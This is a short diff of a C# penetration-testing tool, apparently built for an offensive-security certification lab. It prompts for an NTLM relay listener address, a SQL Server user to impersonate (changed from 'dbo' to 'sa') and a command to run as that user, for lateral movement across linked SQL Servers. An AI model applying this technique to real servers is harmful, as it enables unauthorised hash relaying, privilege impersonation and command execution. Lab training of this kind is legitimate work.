@@ -1,6 +1,6 @@
 ﻿//SQLinks2Move - Version 1
 //Created through OSEP PEN-300 LAB of Offensive Security
-//This tool is used to pratice Lateral Move (most of the time) throught Linked SQL Servers
+//This tool is used to pratice Lateral Move (most of the time) throught Trusted SQL Servers
 //Usage : SQLinks2Move.exe
 //Creator : V0lk3n
 //Creation Date : 04 June 2021
@@ -21,7 +21,7 @@ namespace SQLinks2Move
             Console.WriteLine("Note : You need to setup responder or impacket-ntlmrelayx prior of entering your IP Address");
             Console.Write("Local IP Address for Relay Hash Attack : ");
             String lhost = Console.ReadLine();
-            Console.Write("Username to Impersonate (generally dbo) : ");
+            Console.Write("Username to Impersonate (generally sa) : ");
             String username = Console.ReadLine();
             Console.Write("Command to execute as user "+username+" : ");
             String commandExecAs = Console.ReadLine();
